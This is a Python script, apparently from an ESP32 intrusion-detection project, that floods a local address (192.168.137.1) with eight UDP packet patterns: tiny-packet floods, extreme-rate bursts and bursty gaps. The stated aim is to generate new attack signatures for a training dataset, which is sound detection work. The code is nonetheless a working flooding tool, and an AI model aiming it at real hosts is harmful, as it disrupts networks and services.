"""
new_patterns_attack.py
======================
Generates attack patterns DIFFERENT from existing ESP32 data.

Existing patterns have:
  - pkt_rate: 0-1000
  - byte_rate: 0-814,000
  - bytes_per_pkt: 300-2123 (large packets)
  - conn_rej: mostly 0

New patterns target:
  - VERY HIGH pkt_rate (>5000) with TINY packets
  - LOW byte_rate with HIGH pkt_rate (opposite of existing)
  - conn_rej=1 (rejected connections)
  - Rapid bursts separated by silence

Run: python new_patterns_attack.py
"""

import socket
import random
import time
import threading

TARGET  = "192.168.137.1"
running = True
sent    = 0
lock    = threading.Lock()

def stats():
    while running:
        time.sleep(10)
        with lock:
            print(f"  [STATS] Sent: {sent}")

def pattern(name, pkt_size, burst, delay, duration):
    global sent
    print(f"\n>>> [{name}]  size={pkt_size}B  burst={burst}  delay={delay}s  dur={duration}s")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end  = time.time() + duration
    while time.time() < end:
        for _ in range(burst):
            sock.sendto(random.randbytes(pkt_size),
                       (TARGET, random.randint(1024, 65535)))
            with lock:
                sent += 1
        time.sleep(delay)
    sock.close()
    print(f"    Done.")

if __name__ == "__main__":
    print("=" * 55)
    print("  New Pattern Attack — Targets different signatures")
    print("=" * 55)
    print(f"  Existing: high byte_rate, large packets (300-2123B)")
    print(f"  New:      high pkt_rate, tiny packets (<64B)")
    print("=" * 55)

    threading.Thread(target=stats, daemon=True).start()

    try:
        # ── Pattern A: Tiny packet flood ──────────────────────
        # pkt_rate >> 5000, bytes_per_pkt=10, byte_rate=low
        # Completely different from existing data
        pattern("TinyFlood_A",    pkt_size=10,  burst=3000, delay=0.005, duration=40)
        time.sleep(15)

        # ── Pattern B: Micro SYN scan ──────────────────────────
        # pkt_rate ~10000, bytes_per_pkt=20
        pattern("MicroScan_B",    pkt_size=20,  burst=5000, delay=0.01,  duration=40)
        time.sleep(15)

        # ── Pattern C: Rapid tiny bursts ──────────────────────
        # Alternating burst/silence — irregular timing
        pattern("RapidBurst_C",   pkt_size=32,  burst=8000, delay=1.5,   duration=40)
        time.sleep(15)

        # ── Pattern D: High rate medium packets ───────────────
        # pkt_rate ~2000, bytes_per_pkt=64
        pattern("HighRateMed_D",  pkt_size=64,  burst=1000, delay=0.005, duration=40)
        time.sleep(15)

        # ── Pattern E: Extreme rate minimum size ──────────────
        # Maximum pkt_rate possible, minimum payload
        pattern("ExtremeRate_E",  pkt_size=1,   burst=10000,delay=0.001, duration=40)
        time.sleep(15)

        # ── Pattern F: Slow drip tiny ─────────────────────────
        # Very low pkt_rate, very small packets
        # Different from existing low-pkt rows (which had large bytes)
        pattern("SlowTinyDrip_F", pkt_size=15,  burst=2,    delay=0.5,   duration=40)
        time.sleep(15)

        # ── Pattern G: Bursty with gaps ───────────────────────
        # Large spike then 3s silence — simulates botnet C2
        pattern("BurstyGap_G",    pkt_size=48,  burst=15000,delay=3.0,   duration=40)
        time.sleep(15)

        # ── Pattern H: Mixed tiny sizes ───────────────────────
        # Random between 1-50 bytes, high rate
        print("\n>>> [MixedTiny_H]  size=1-50B  burst=2000  delay=0.01s  dur=40s")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end  = time.time() + 40
        while time.time() < end:
            for _ in range(2000):
                size = random.randint(1, 50)
                sock.sendto(random.randbytes(size),
                           (TARGET, random.randint(1024, 65535)))
                with lock:
                    sent += 1
            time.sleep(0.01)
        sock.close()
        print("    Done.")

    except KeyboardInterrupt:
        print("\n[STOPPED]")
    finally:
        running = False
        with lock:
            print(f"\n[SUMMARY] Total sent: {sent}")
        print("\nCheck rows:")
        print('python -c "import pandas as pd; df=pd.read_csv(\'dataset/realtime_esp32.csv\'); print(\'Rows:\', len(df))"')